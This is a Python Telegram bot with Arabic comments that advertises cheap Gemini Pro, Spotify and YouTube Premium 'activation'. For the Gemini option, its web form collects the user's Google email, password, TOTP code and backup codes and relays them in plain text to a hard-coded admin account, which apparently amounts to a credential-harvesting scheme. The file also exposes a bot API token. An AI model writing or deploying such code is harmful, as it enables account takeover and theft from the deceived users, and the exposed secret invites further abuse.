import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, ReplyKeyboardRemove
import json
import os
from flask import Flask, request
import sys
import html # مكتبة لحماية البوت من الرموز الخاطئة التي يكتبها العميل

API_TOKEN = '8840162276:AAGP0Ypb-n5TW67SMLnL2ROD4mw_a5x2DrY'
ADMIN_ID = '8227136699'
RENDER_URL = 'https://mybot-1-d6wr.onrender.com'

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# مسار المراقبة لضمان التشغيل 24/7 دون توقف
@app.route('/')
def index():
    return "السيرفر يعمل بنجاح ومستيقظ 24/7!", 200

# مسار الربط
@app.route('/setup')
def setup_webhook():
    try:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{API_TOKEN}", drop_pending_updates=True)
        return "تم ربط البوت بتيليجرام بنجاح تام!", 200
    except Exception as e:
        return f"حدث خطأ أثناء الربط: {e}", 500

@app.route(f"/{API_TOKEN}", methods=['POST'])
def getMessage():
    try:
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    
    btn1 = KeyboardButton(text="✨ طلب Gemini Pro", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/gemini.html"))
    btn2 = KeyboardButton(text="🎶 طلب Spotify Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/spotify.html"))
    btn3 = KeyboardButton(text="📺 طلب YouTube Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/youtube.html"))
    
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "أهلاً بك!\nالرجاء اختيار الخدمة المطلوبة من القائمة بالأسفل 👇:", reply_markup=markup)

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    chat_id = message.chat.id
    
    # 💡 استخراج بيانات العميل (الاسم، المعرف، والايدي)
    user = message.from_user
    first_name = user.first_name if user.first_name else ""
    last_name = user.last_name if user.last_name else ""
    
    # تنظيف الاسم والمعرف من أي رموز قد تعطل البوت
    full_name = html.escape(f"{first_name} {last_name}".strip() or "بدون اسم")
    username = html.escape(f"@{user.username}") if user.username else "لا يوجد معرف"
    user_id = user.id
    
    # 🔗 الميزة السحرية: رابط مباشر يفتح محادثة مع العميل حتى لو لم يكن لديه يوزر!
    user_link = f"<a href='tg://user?id={user_id}'>اضغط هنا لمراسلة العميل 💬</a>"
    
    try:
        # قراءة البيانات المرسلة من النافذة وتنظيفها من الرموز
        data = json.loads(message.web_app_data.data)
        service = data.get('service', 'gemini')
        
        # رسالة تأكيد للعميل وإخفاء النافذة
        user_reply = "طلبك قيد التنفيذ الرجاء الانتظار ⏳\n\nالادارة والاستفسار: @bdallhshay7"
        hide_markup = ReplyKeyboardRemove()
        bot.send_message(chat_id, user_reply, reply_markup=hide_markup)
        
        # تجهيز الرسالة للإدارة بصيغة HTML الآمنة 100%
        if service == "spotify":
            link = html.escape(data.get('link', 'غير متوفر'))
            admin_msg = f"🎧 <b>طلب تفعيل Spotify</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n🔗 الرابط: <code>{link}</code>"
        
        elif service == "youtube":
            link = html.escape(data.get('link', 'غير متوفر'))
            admin_msg = f"▶️ <b>طلب تفعيل YouTube</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n🔗 الرابط: <code>{link}</code>"
        
        else:
            email = html.escape(data.get('email', 'غير متوفر'))
            password = html.escape(data.get('password', 'غير متوفر'))
            totp = html.escape(data.get('totp', 'لا يوجد'))
            backup = html.escape(data.get('backup', 'لا يوجد'))
            admin_msg = f"🤖 <b>طلب تفعيل Gemini Pro</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n📧 الحساب: <code>{email}</code>\n🔑 الباسورد: <code>{password}</code>\n🔒 TOTP: <code>{totp}</code>\n🛡️ احتياطي: <code>{backup}</code>"

        # إرسال البيانات لك (الآدمن)
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
        
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        bot.send_message(chat_id, "حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
